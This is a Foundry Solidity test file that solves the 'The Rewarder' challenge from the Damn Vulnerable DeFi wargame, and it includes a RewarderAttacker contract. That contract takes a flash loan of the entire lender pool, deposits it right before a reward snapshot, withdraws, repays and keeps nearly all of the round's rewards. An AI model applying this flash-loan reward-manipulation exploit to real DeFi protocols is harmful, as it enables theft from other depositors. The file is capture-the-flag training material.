// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {AccountingToken} from "../src/the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../src/the-rewarder/FlashLoanerPool.sol";
import {RewardToken} from "../src/the-rewarder/RewardToken.sol";
import {TheRewarderPool} from "../src/the-rewarder/TheRewarderPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract TheRewarder is Test {
    uint256 public constant TOKENS_IN_LENDER_POOL = 1_000_000 * 1e18;

    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address player = makeAddr("player");
    address[4] users = [alice, bob, charlie, david];

    DamnValuableToken liquidityToken;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    AccountingToken accountingToken;

    uint256 minterRole;
    uint256 snapshotRole;
    uint256 burnerRole;

    function setUp() public {
        liquidityToken = new DamnValuableToken();
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));
        deal(address(liquidityToken), address(flashLoanPool), TOKENS_IN_LENDER_POOL);
        rewarderPool = new TheRewarderPool(address(liquidityToken));
        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accountingToken();
        assertEq(accountingToken.owner(), address(rewarderPool));
        minterRole = accountingToken.MINTER_ROLE();
        snapshotRole = accountingToken.SNAPSHOT_ROLE();
        burnerRole = accountingToken.BURNER_ROLE();
        assert(accountingToken.hasAllRoles(address(rewarderPool), minterRole | snapshotRole | burnerRole));

        uint256 depositAmount = 100 * 1e18;
        for (uint256 i; i < users.length; i++) {
            deal(address(liquidityToken), users[i], depositAmount);
            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), depositAmount);
            rewarderPool.deposit(depositAmount);
            vm.stopPrank();
            assertEq(accountingToken.balanceOf(users[i]), depositAmount);
        }
        assertEq(accountingToken.totalSupply(), depositAmount * users.length);
        assertEq(rewardToken.totalSupply(), 0);

        vm.warp(block.timestamp + 5 days);

        uint256 rewardsInRound = rewarderPool.REWARDS();
        for (uint256 i; i < users.length; i++) {
            vm.startPrank(users[i]);
            rewarderPool.distributeRewards();
            vm.stopPrank();
            assertEq(rewardToken.balanceOf(users[i]), rewardsInRound / users.length);
        }
        assertEq(rewardToken.totalSupply(), rewardsInRound);

        assertEq(liquidityToken.balanceOf(player), 0);
        assertEq(rewarderPool.roundNumber(), 2);
    }

    function test_can_claim_most_rewards() public {
        vm.warp(block.timestamp + 5 days);
        vm.startPrank(player);
        RewarderAttacker attacker = new RewarderAttacker(
            address(flashLoanPool), address(rewarderPool), address(liquidityToken), address(rewardToken)
        );
        attacker.initiate();
        vm.stopPrank();

        ///////////////////////
        assertEq(rewarderPool.roundNumber(), 3);

        for (uint256 i; i < users.length; i++) {
            vm.startPrank(users[i]);
            rewarderPool.distributeRewards();
            vm.stopPrank();
            uint256 userRewards = rewardToken.balanceOf(users[i]);
            uint256 deltaLoop = userRewards - (rewarderPool.REWARDS() / users.length);
            assertLt(deltaLoop, 1 * 1e16);
        }

        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
        uint256 playerRewards = rewardToken.balanceOf(player);
        assertGt(playerRewards, 0);

        uint256 delta = rewarderPool.REWARDS() - playerRewards;
        assertLt(delta, 1 * 1e17);

        assertEq(liquidityToken.balanceOf(player), 0);
        assertEq(liquidityToken.balanceOf(address(flashLoanPool)), TOKENS_IN_LENDER_POOL);
    }
}

contract RewarderAttacker {
    address owner;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    AccountingToken accountingToken;
    uint256 public constant TOKENS_IN_LENDER_POOL = 1_000_000 * 1e18;

    constructor(address _flashLoanPool, address _rewarderPool, address _liquidityToken, address _rewardToken) {
        owner = msg.sender;
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
    }

    function initiate() external {
        if (msg.sender != owner) revert();
        flashLoanPool.flashLoan(TOKENS_IN_LENDER_POOL);
    }

    function receiveFlashLoan(uint256 _amount) external {
        if (msg.sender != address(flashLoanPool)) revert();

        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(TOKENS_IN_LENDER_POOL);
        liquidityToken.transfer(address(flashLoanPool), liquidityToken.balanceOf(address(this)));
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
